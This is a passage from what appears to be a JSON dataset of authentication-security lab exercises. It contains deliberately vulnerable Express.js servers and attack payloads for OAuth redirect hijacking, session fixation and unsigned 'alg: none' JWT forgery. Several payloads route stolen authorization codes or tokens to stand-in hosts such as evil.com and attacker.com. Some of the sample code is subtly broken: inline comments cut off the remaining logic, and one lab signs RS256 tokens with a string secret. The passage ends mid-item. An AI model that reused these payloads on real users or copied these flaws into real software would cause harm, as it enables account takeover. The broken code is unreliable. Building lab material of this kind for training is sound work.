  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to analyze the OAuth login flow and find an open redirect vulnerability in the redirect_uri parameter.",
    "Craft a malicious URL to redirect authorization code to your server (e.g., https://evil.com/log?code=...).",
    "Send the malicious link to Carlos and capture the code from incoming requests.",
    "Use Postman to exchange the stolen code for an access token by calling /oauth/token.",
    "Replay login with the obtained token and access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/login/oauth', (req, res) => { const redirect = req.query.redirect_uri; const state = req.query.state; const url = `https://auth-provider.com/authorize?client_id=app123&redirect_uri=${redirect}&state=${state}`; res.redirect(url); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; request.post('https://auth-provider.com/token', { form: { code, client_id: 'app123', client_secret: 'secret123' } }, (err, response, body) => { if (err) return res.status(500).send('Token exchange failed'); res.send('Logged in with OAuth'); }); }); app.get('/my-account', (req, res) => { res.send('Carlos Account Info'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",
  "payloads": [
    "https://vulnerable-app.com/login/oauth?redirect_uri=https://evil.com/log",
    "Captured code=abc123",
    "POST /oauth/token with code=abc123",
    "Access /my-account with resulting token"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Redirection Mechanism",
  "Lab Description": "The application incorrectly allows pre-authenticated session IDs to persist through login. An attacker can fix a session ID for a victim and hijack the session post-login. The application accepts session IDs via URL query parameters and uses them post-login. To solve: hijack Carlos’s session by fixing a session ID and accessing his account page after login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login request and notice the session ID being reused from a GET parameter (?sid=...)",
    "2. Generate a session ID manually and craft a malicious login URL: /login?sid=attackerSession",
    "3. Send this URL to the victim and wait for them to authenticate using it (assume link click)",
    "4. Monitor /my-account using Burp with sid=attackerSession and check for session elevation",
    "5. Access Carlos’s account using the fixed session"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); const sessions = {}; const users = { carlos: 'supersecret' }; app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.query.sid || req.cookies?.sid; if (sid) req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.sessionID] = username; res.send('Logged in!'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (sessions[req.sessionID] === 'carlos') res.send('Account: Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab on port 4000'));",
  "payloads": [
    "GET /login?sid=attackerSession",
    "POST /login with body: username=carlos&password=supersecret",
    "GET /my-account?sid=attackerSession"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL Authorization Header",
  "Lab Description": "This GraphQL-based API uses JWT for user authentication, but improperly accepts tokens signed with 'alg':'none'. This allows attackers to forge arbitrary tokens. The vulnerable middleware fails to verify the signature when alg=none. To solve: forge an admin JWT and query the adminGraph.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to send a GraphQL introspection query and discover the 'adminGraph' endpoint.",
    "2. Analyze a valid JWT using jwt.io and note header/payload structure.",
    "3. Forge a new token with 'alg':'none' and 'role':'admin' in payload; remove the signature.",
    "4. Set this token in the Authorization: Bearer header.",
    "5. Send a GraphQL query to { adminGraph { secret } } to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const graphqlHTTP = require('express-graphql'); const schema = require('./schema'); app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; try { req.user = jwt.verify(token, 'hardcoded-secret'); } catch (e) { if (JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()).alg === 'none') req.user = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT None GraphQL Lab running'));",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"role\": \"admin\" }.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "GraphQL query: { adminGraph { secret } }"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
  "Lab Description": "The application integrates with a third-party OAuth provider but improperly validates the redirect_uri parameter. An attacker can manipulate this parameter to intercept OAuth tokens. The system allows open redirect behavior with a whitelisted domain suffix only. To solve: capture Carlos’s OAuth code via redirect hijack and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to crawl the /auth endpoint and identify redirect_uri parameter.",
    "2. Send a login URL with redirect_uri=https://attacker.com%23access_token=... (bypassing suffix check via encoded fragment).",
    "3. Host a malicious redirector to log captured tokens.",
    "4. Use captured token to call /oauth-callback and gain access to Carlos’s account.",
    "5. Visit /my-account with valid session/cookie."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; if (!redirect_uri.endsWith('trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'carlos-oauth-token'; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/oauth-callback', (req, res) => { const token = req.query.token; if (token === 'carlos-oauth-token') res.send('Carlos account accessed'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
  "payloads": [
    "GET /auth?redirect_uri=https://attacker.com%23access_token=carlos-oauth-token",
    "Capture #access_token from attacker.com logs",
    "GET /oauth-callback?token=carlos-oauth-token"
  ]
},
{
  "Lab scenario": "Session fixation in SAML SSO login flow",
  "Lab Description": "This lab simulates a vulnerable Single Sign-On (SSO) integration using SAML. Due to poor session handling during the pre-authentication phase, attackers can fix a session ID before login. The application reuses the existing session after successful SAML login without regenerating a new session ID. To solve: Hijack Carlos’s account session using a pre-fixed session ID.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a pre-authenticated GET /sso-init request. Note the Set-Cookie: session ID issued.",
    "2. Log out and forward this session ID to Burp Intruder for future fixation testing.",
    "3. Initiate the SSO flow again but manipulate the session ID manually by injecting your known session cookie.",
    "4. Complete SSO login using your own credentials while ensuring the fixed session ID remains unchanged.",
    "5. Share the fixed session cookie with another browser or curl instance and observe the hijacked post-login session under Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/sso-init', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.redirect('/sso-login'); }); app.post('/sso-login', (req, res) => { const sid = req.cookies.session; const user = req.body.user; if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); sessions[sid].authenticated = true; sessions[sid].user = user; res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log('SSO Fixation Lab at http://localhost:' + PORT));",
  "payloads": [
    "Set-Cookie: session=fixedSessionID123;",
    "POST /sso-login HTTP/1.1 with Cookie: session=fixedSessionID123 and user=carlos",
    "Reuse fixedSessionID123 in secondary browser"
  ]
},
{
  "Lab scenario": "JWT none algorithm authentication bypass",
  "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, the token verification logic does not enforce algorithm validation, allowing an attacker to forge tokens using 'alg: none'. To solve: Forge a valid JWT with admin privileges and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite or Postman to intercept a request containing an Authorization: Bearer <JWT> header.",
    "2. Decode the JWT using jwt.io and observe the alg value in the header.",
    "3. Replace 'alg' with 'none' and modify the payload to {\"username\": \"admin\"}.",
    "4. Base64 encode the new header and payload. Remove the signature entirely.",
    "5. Reuse the forged JWT to access the /admin route and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') res.send('Welcome admin'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab running at http://localhost:' + PORT));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"admin\" }",
    "Forged JWT: <Base64(header)>.<Base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration leaking authorization code to attacker",
  "Lab Description": "The application uses OAuth for user authentication. It incorrectly allows redirection to arbitrary domains, including those under attacker control. This redirection vulnerability enables the attacker to intercept the authorization code. To solve: Capture Carlos’s authorization code using a malicious redirect URI and exchange it for an access token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the OAuth authorization request to /auth?client_id=...&redirect_uri=...",
    "2. Modify the redirect_uri parameter to point to a server under your control (e.g., https://evil.com/callback).",
    "3. Send the link to Carlos or wait for him to authenticate via phishing.",
    "4. Capture the code parameter from the redirected request on your server.",
    "5. Exchange the captured code at the /token endpoint to receive an access_token and access the victim’s profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (user) res.json({ access_token: 'token-for-' + user }); else res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === 'token-for-carlos') res.send('Carlos profile data'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab on http://localhost:' + PORT));",
  "payloads": [
    "GET /auth?client_id=app123&redirect_uri=https://evil.com/callback",
    "GET /token with code=<intercepted_code>",
    "GET /profile?access_token=token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST-based login endpoint",
  "Lab Description": "The application's login mechanism is vulnerable to session fixation due to session ID reuse. The application does not regenerate the session ID upon successful login. To solve: Fixate the victim’s session ID before they log in, then hijack their session and access their profile page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a GET /login request and observe the session cookie issued before authentication.",
    "2.Send the session cookie to the victim via social engineering or inject it into a URL as a phishing link.",
    "3.After the victim logs in using the fixed session, reuse the same session ID in your browser.",
    "4.Navigate to /profile and confirm access to the victim's authenticated session.",
    "5.Validate exploitation by checking victim’s profile data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { res.send('Login page - Session ID: ' + req.sessionID); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.send('Logged in successfully'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { if (req.session.authenticated) { res.send('Welcome ' + req.session.username + ', here is your profile.'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Phishing URL with session ID: http://vulnerable-app.com/login?PHPSESSID=known_session_id",
    "Browser cookie injection: document.cookie='PHPSESSID=known_session_id'"
  ]
},
{
  "Lab scenario": "JWT 'none' algorithm authentication bypass in GraphQL API",
  "Lab Description": "The GraphQL login API accepts JWT tokens with 'none' algorithm and skips signature verification. To solve: Forge a JWT with alg=none to impersonate Carlos and access the /graphql profile query.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Intercept the login request via Postman and observe the Authorization: Bearer <JWT> header after login.",
    "2.Decode the JWT and note the structure and payload.",
    "3.Craft a new JWT with 'alg':'none', 'username':'carlos' and no signature.",
    "4.Use the forged token in the Authorization header to query the profile.",
    "5.Verify profile access for Carlos to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { profile: String }`); const root = { profile: (args, req) => req.user ? `Welcome ${req.user.username}` : 'Unauthorized' }; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { try { const token = auth.split(' ')[1]; req.user = jwt.verify(token, 'secretKey', { algorithms: ['HS256', 'none'] }); } catch (err) { console.log('JWT Error:', err.message); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Bypass Lab on http://localhost:4001/graphql'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "Final JWT: <base64(header)>.<base64(payload)>."
  ]
},
{
  "Lab scenario": "OAuth token leakage via redirect URI in SOAP-based client",
  "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs. This leads to token leakage when attackers inject malicious redirect URIs. To solve: Extract the victim's access token via a crafted OAuth authorization link, then use it to call a SOAP action on behalf of Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Initiate an OAuth flow and observe the redirect URI behavior in the SOAP client’s login form.",
    "2.Create a malicious authorization URL with redirect_uri pointing to attacker.com.",
    "3.Trick the victim into clicking the OAuth URL and capture the access token via URL fragment.",
    "4.Use SOAP UI or Postman to call the SOAP getUserDetails action with Authorization: Bearer <token>.",
    "5.Verify that you retrieved Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': { username: 'carlos' } }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; const token = 'abc123'; // hardcoded for demo res.redirect(`${redirect_uri}#access_token=${token}`); }); app.post('/soap', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`<soap:Envelope><soap:Body><username>${user.username}</username></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Leak Lab running on port 4002'));",
  "payloads": [
    "https://auth.example.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=https://attacker.com",
    "Authorization: Bearer abc123",
    "SOAP Body: <soap:Envelope><soap:Body><getUserDetails/></soap:Body></soap:Envelope>"
  ]
},
{
  "Lab scenario": "Session Fixation in GraphQL Login Mutation",
  "Lab Description": "The GraphQL API login endpoint uses a fixed session ID before authentication, allowing session fixation. The application accepts a `sessionid` cookie that is issued before login and preserved after authentication. To solve: Hijack a victim's session by predefining a session ID, tricking them into using it, and authenticating as them.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, observe that an unauthenticated POST /graphql mutation returns a `Set-Cookie: sessionid=<random>` before login.",
    "2.Use Burp Repeater to issue a fixed sessionid cookie like `sessionid=attackersession123` and call the login mutation. Notice it stays unchanged after successful login.",
    "3.Share a crafted phishing link to the victim pointing to `https://vulnerable-app/login` with the session cookie pre-set using JavaScript (via reflected XSS or email).",
    "4.After the victim logs in using the pre-set session ID, capture authenticated responses using the same sessionid=attackersession123 in your own requests.",
    "5.Verify you can access /my-account GraphQL query using the fixed session cookie to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cret' }]; const sessions = {}; app.post('/graphql', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); if (!sessions[sid]) sessions[sid] = { authenticated: false }; const { query } = req.body; if (query.includes('login')) { const [_, username, password] = query.match(/login\\(username: \"(.*?)\", password: \"(.*?)\"\\)/); const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid].authenticated = true; res.cookie('sessionid', sid); return res.send({ data: { login: true } }); } } if (query.includes('myAccount') && sessions[sid]?.authenticated) return res.send({ data: { myAccount: 'Carlos Account Data' } }); res.status(403).send({ error: 'Unauthorized' }); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Cookie: sessionid=attackersession123",
    "GraphQL Mutation: mutation { login(username: \"carlos\", password: \"s3cret\") }",
    "GraphQL Query: query { myAccount }"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in REST API",
  "Lab Description": "The application uses JWT tokens for user sessions, but fails to validate the `alg` field. The server accepts JWTs with `alg: none`, allowing unsigned tokens. To solve: Forge a JWT token for the user `carlos` and access the protected profile endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Log in as your own user and intercept the POST /login response using Burp Suite. Capture the JWT token from the Set-Cookie header.",
    "2.Decode the JWT using jwt.io and observe the algorithm is `HS256`, but the server doesn't validate it.",
    "3.Craft a new JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }, then base64 encode them and omit the signature part.",
    "4.Set this forged JWT in the Authorization header as `Bearer <token>`.",
    "5.Send a GET /profile request using Postman with the forged JWT and verify you access Carlos's profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ profile: 'Carlos profile data' }); jwt.verify(token, secret); return res.json({ profile: 'Authenticated profile' }); } catch { return res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT (Unsigned): base64(header).base64(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Misconfiguration in SOAP API",
  "Lab Description": "The app uses an OAuth implicit flow but fails to validate the `aud` (audience) parameter. Attackers can supply their own token intended for a different client ID to gain access. To solve: Forge an access token using a public OAuth tool and access the SOAP profile service.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1.Use a tool like Postman to initiate an OAuth implicit flow with a public redirect URI.",
    "2.Intercept the access_token returned in the URI fragment. Decode it and observe the `aud` claim allows any string.",
    "3.Replace the token with one containing { \"sub\": \"carlos\", \"aud\": \"evil-client\" }.",
    "4.Send a SOAP request to /soap/profile with Authorization: Bearer <forged_token>.",
    "5.Verify access to Carlos’s profile data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(xmlparser()); app.use(bodyParser.json()); app.post('/soap/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.sub === 'carlos') return res.send(`<Profile><Name>Carlos</Name><Role>Admin</Role></Profile>`); } catch { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
  "payloads": [
    "Authorization: Bearer eyJhbGciOiJI... (JWT with sub: 'carlos', aud: 'evil-client')",
    "SOAP Body: <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><getProfile/></soapenv:Body></soapenv:Envelope>"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login response headers",
  "Lab Description": "The application issues a session identifier before login and does not regenerate it upon successful authentication. The session ID remains constant, allowing fixation attacks. The application stores sessions using cookies. To solve: hijack Carlos's session by fixing a known session ID and using it after they log in.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and observe the Set-Cookie header assigning a session ID before authentication.",
    "2.Send a GET /login request and capture the session ID from the Set-Cookie header.",
    "3.Share this session ID with Carlos and wait until they log in using the fixed session.",
    "4.Once Carlos is logged in, reuse the same session ID in your browser using an interceptor or session editor extension.",
    "5.Access /my-account to verify the session hijack was successful."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'secure123' }]; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sessionid', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome back!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.authenticated) { res.send('Account for ' + sessions[sid].user); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab on http://localhost:' + PORT));",
  "payloads": [
    "Reuse pre-login session cookie after victim authenticates",
    "Manually inject sessionid cookie into browser post-login",
    "Use Burp Cookie Editor to set fixed sessionid"
  ]
},
{
  "Lab scenario": "JWT tampering vulnerability in token verification logic",
  "Lab Description": "The application uses JWTs for session management but fails to validate the algorithm correctly. It accepts tokens signed with 'none' algorithm, trusting their content without signature verification. To solve: craft a forged token granting admin access using alg=none and access Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Capture a valid JWT issued after login using Burp Suite Proxy.",
    "2.Decode the token using jwt.io or Burp Decoder and observe the 'alg' field is RS256.",
    "3.Create a new token with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"role\":\"admin\"}.",
    "4.Remove the signature part completely.",
    "5.Replace the Authorization header with the new forged token using Burp Repeater or Postman.",
    "6.Send the request to /my-account and verify admin access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secure123') { const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Accessing Carlos account as ' + payload.role); return res.status(403).send('Forbidden'); } jwt.verify(token, secret, (err, payload) => { if (err) return res.status(403).send('Forbidden'); res.send('Accessing ' + payload.username + '\'s account'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab on http://localhost:' + PORT));",
  "payloads": [
    "JWT with alg: none and payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "Remove JWT signature and inject forged token via Authorization header",
    "Use jwt.io to craft unsigned token and insert manually"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in implicit grant redirect",
  "Lab Description": "The application uses OAuth 2.0 for third-party authentication but accepts arbitrary redirect URIs without validation. Attackers can hijack tokens using a crafted malicious redirect. To solve: intercept Carlos’s OAuth token using a poisoned redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Open the login URL that triggers the OAuth flow: /auth?provider=oauth&redirect_uri=https://your-site.com/callback.",
    "2.Intercept the request in Burp and change the redirect_uri to your exploit server URL.",
    "3.Send the request. The authorization code/token will be sent to your exploit server as part of the URI fragment.",
    "4.Copy the access_token from the received request URI.",
    "5.Use Postman to send an authenticated request to /my-account using the stolen Bearer token.",
    "6.Verify successful access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; // No validation! const token = 'access_token_carlos'; const fragment = qs.stringify({ access_token: token, token_type: 'bearer' }); res.redirect(`${redirect_uri}#${fragment}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access_token_carlos') res.send('Access to Carlos account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running at http://localhost:' + PORT));",
  "payloads": [
    "Change redirect_uri to your exploit server in OAuth GET request",
    "Capture access_token from URI fragment on exploit server",
    "Use Bearer access_token_carlos to access /my-account"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in REST API",
  "Lab Description": "This lab demonstrates a session fixation vulnerability in a RESTful login system. The backend accepts user-supplied session tokens without regenerating them after authentication. The application reflects session tokens provided in requests, and fails to assign a new one on login. To solve: fixate Carlos’s session, then access his account using the pre-established session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a POST /login request and observe that the server reflects the session cookie in the response.",
    "Send a crafted request using Burp Repeater with a known session ID, such as `X-Session-ID: fixed123`, before login.",
    "Observe that after login, the server accepts the supplied session ID and uses it for authenticated state.",
    "Have the victim (Carlos) log in with a fixated session by tricking them to reuse the injected session ID (e.g., through an email link).",
    "Use the same session ID to access GET /account-details with `X-Session-ID: fixed123` and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.headers['x-session-id'] || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); sessions[sessionId] = username; res.setHeader('Set-Cookie', 'X-Session-ID=' + sessionId); res.send({ message: 'Logged in' }); }); app.get('/account-details', (req, res) => { const sessionId = req.headers['x-session-id']; if (!sessions[sessionId]) return res.status(401).send('Not logged in'); res.send('Account details for ' + sessions[sessionId]); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "X-Session-ID: fixed123",
    "POST /login { \"username\": \"carlos\", \"password\": \"secret123\" } + Header: X-Session-ID: fixed123",
    "GET /account-details + Header: X-Session-ID: fixed123"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in GraphQL API",
  "Lab Description": "This lab exposes a JWT tampering flaw via the 'none' algorithm in a GraphQL-based authentication endpoint. The JWT is accepted without signature verification when alg=none is used. To solve: Forge a JWT token as 'admin' and access the sensitive adminGraph endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to login and inspect the Authorization: Bearer token used in GraphQL requests.",
    "Decode the JWT using jwt.io and observe it uses RS256 algorithm.",
    "Craft a new token with `\"alg\": \"none\"` and change `\"username\": \"admin\"`.",
    "Remove the JWT signature section (third part of the token) and send this forged token in Authorization header.",
    "Use GraphQL introspection or replay to access `query { adminGraph { flag } }` and validate access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { adminGraph: String }`); const root = { adminGraph: (args, context) => { if (context.user !== 'admin') throw new Error('Unauthorized'); return 'FLAG-9f84bfa'; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; let payload; try { payload = jwt.verify(token, 'PRIVATE_KEY', { algorithms: ['RS256', 'none'] }); } catch (err) { return res.status(401).send('Invalid token'); } req.user = payload.username; next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.listen(4001, () => console.log('JWT None Lab running'));",
  "payloads": [
    "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "JWT payload: {\"username\":\"admin\"}",
    "Authorization: Bearer <base64(header)>.base64(payload).",
    "GraphQL Query: { adminGraph { flag } }"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Token Leak via Redirect Manipulation in SOAP Endpoint",
  "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs, exposing access tokens via fragment identifiers to untrusted domains. The SOAP authentication callback endpoint reflects redirect URLs without validation. To solve: Capture Carlos's access token by crafting a malicious redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to analyze the /oauth/callback SOAP endpoint and observe it reflects `redirect_uri` unsanitized.",
    "Craft an authorization URL with `redirect_uri=https://evil.com#access_token=...` and send it to Carlos.",
    "Host a listener on evil.com and monitor traffic.",
    "When Carlos clicks the link and logs in, the access_token is leaked via the fragment to the attacker domain.",
